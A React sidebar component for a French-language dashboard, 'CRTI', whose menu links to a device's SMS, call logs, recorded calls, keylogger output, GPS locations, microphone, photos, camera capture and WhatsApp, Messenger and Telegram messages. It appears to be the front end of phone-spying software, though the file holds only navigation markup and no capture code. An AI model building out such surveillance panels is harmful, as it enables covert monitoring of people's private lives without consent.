import {NavLink} from "react-router-dom";
import {useEffect, useState} from "react";
import {onAuthStateChanged} from "firebase/auth";
import {auth} from "../firebase";

let arrow = document.querySelectorAll(".arrow");

for (var i = 0; i < arrow.length; i++) {
    arrow[i].addEventListener("click", (e) => {
        let arrowParent = e.target.parentElement.parentElement;
        console.log(arrowParent);
        arrowParent.classList.toggle("showMenu");
    });
}

let sidebar = document.querySelector(".sidebar");
let sidebarBtn = document.querySelector(".sidebarBtn");

// Unsoucis sur le Onclick pour activer le arrow du subMenu
// sidebarBtn.onclick = function(){
//     sidebar.classList.toggle("active");
// }
// FinOnCilick

export default function Sidebar() {
    const [user, setUser] = useState(null);

    useEffect(() => {
        onAuthStateChanged(auth, (user) => {
            if (user) {
                setUser(user);
            }
        })
    })

    return user ? <div className="col-auto col-md-3 col-xl-2 px-sm-2 px-0 bg-dark">
        <div
            className="d-flex flex-column align-items-center align-items-sm-start px-3 pt-2 text-white min-vh-100 sidebar">
            <a href="/"
               className="d-flex align-items-center pb-3 mb-md-0 me-md-auto text-white text-decoration-none logo-details">
                <i className='bx bx-globe'></i>
                <span className="fs-5 d-none d-sm-inline logo">CRTI</span>
            </a>

            {
                <ul className="nav-links">
                    <li>
                        <a href="/">
                            <i className='bx bxs-home'></i>
                            <span className="link_name ft">Tableau de bord</span>
                        </a>
                    </li>

                    {/* SubMenu alternative for presentation */}
                    <li>
                        <a href="/contacts">
                            <i className='bx bx-phone-call'></i>
                            <span className="link_name ft">Contact</span>
                        </a>
                    </li>

                    <li>
                        <a href="/sms">
                            <i className='bx bx-text'></i>
                            <span className="link_name ft">Messages texts</span>
                        </a>
                    </li>

                    <li>
                        <a href="/call-logs">
                            <i className='bx bx-log-in-circle'/>
                            <span className="link_name ft">Appels</span>
                        </a>
                    </li>

                    <li>
                        <a href="/keylogger">
                            <i className='bx bx-dialpad-alt'/>
                            <span className="link_name ft">Saisie clavier</span>
                        </a>
                    </li>

                    <li>
                        <a href="/installed-apps">
                            <i className='bx bxs-comment-detail'/>
                            <span className="link_name ft">Application</span>
                        </a>
                    </li>

                    <li>
                        <a href="/calls">
                            <i className='bx bx-podcast'/>
                            <span className="link_name ft">Appels enreg</span>
                        </a>
                    </li>
                    {/* End SubMenu alternative for presentation */}

                    <li>
                        <a href="/emplacement-gps">
                            <i class='bx bx-location-plus'></i>
                            <span className="link_name ft">Position actuelle</span>
                        </a>
                    </li>

                    <li>
                        <a href="/emplacements-gps">
                            <i className='bx bx-current-location'/>
                            <span className="link_name ft">Emplacements GPS</span>
                        </a>
                    </li>

                    <li>
                        <a href="/microphone">
                            <i class='bx bx-microphone'></i>
                            <span className="link_name ft">Microphone</span>
                        </a>
                    </li>

                    <li>
                        <a href="/photos">
                            <i class='bx bx-photo-album'></i>
                            <span className="link_name ft">Photos</span>
                        </a>
                    </li>
                    <li>
                        <a href="/videos">
                            <i class='bx bx-video'></i>
                            <span className="link_name ft">Vidéos</span>
                        </a>
                    </li>

                    <li>
                        <a href="/social/whatsapp">
                            <i class='bx bxl-whatsapp'></i>
                            <span className="link_name ft">WhatsApp</span>
                        </a>
                    </li>

                    <li>
                        <a href="/social/messenger">
                            <i className='bx bxl-meta'/>
                            <span className="link_name ft">Messenger</span>
                        </a>
                    </li>

                    <li>
                        <a href="/social/telegram">
                            <i class='bx bxl-telegram'></i>
                            <span className="link_name ft">Telegram</span>
                        </a>
                    </li>

                    {/* <li>
                                <a href="/screenshots">
                                    <i class='bx bx-screenshot' ></i>
                                    <span className="link_name ft">Capture Caméra</span>
                                </a>
                                <ul className="sub-menu blank">
                                    <li><a href="#" className="l-name ft">capture</a></li>
                                </ul>
                            </li> */}

                    <li>
                        <a href="/capture-camera">
                            <i className='bx bx-screenshot'/>
                            <span className="link_name ft">Capture camera</span>
                        </a>
                    </li>
                </ul>

            }
            <hr/>
            <div className="dropdown pb-4">
                <a href="#"
                   className="d-flex align-items-center text-white text-decoration-none dropdown-toggle"
                   id="dropdownUser1" data-bs-toggle="dropdown" aria-expanded="false">
                    <img src="https://github.com/mdo.png" alt="hugenerd" width="30" height="30"
                         className="rounded-circle"/>
                    <span className="d-none d-sm-inline mx-1">{user?.email}</span>
                </a>
                <ul className="dropdown-menu dropdown-menu-dark text-small shadow">
                    <li><a className="dropdown-item" href="#">Settings</a>
                        > Odilon:
                    </li>
                    <li>
                        <hr className="dropdown-divider"/>
                    </li>
                    <li><a className="dropdown-item" href="#">Déconnexion</a></li>
                </ul>
            </div>
        </div>
    </div> : <></>
}
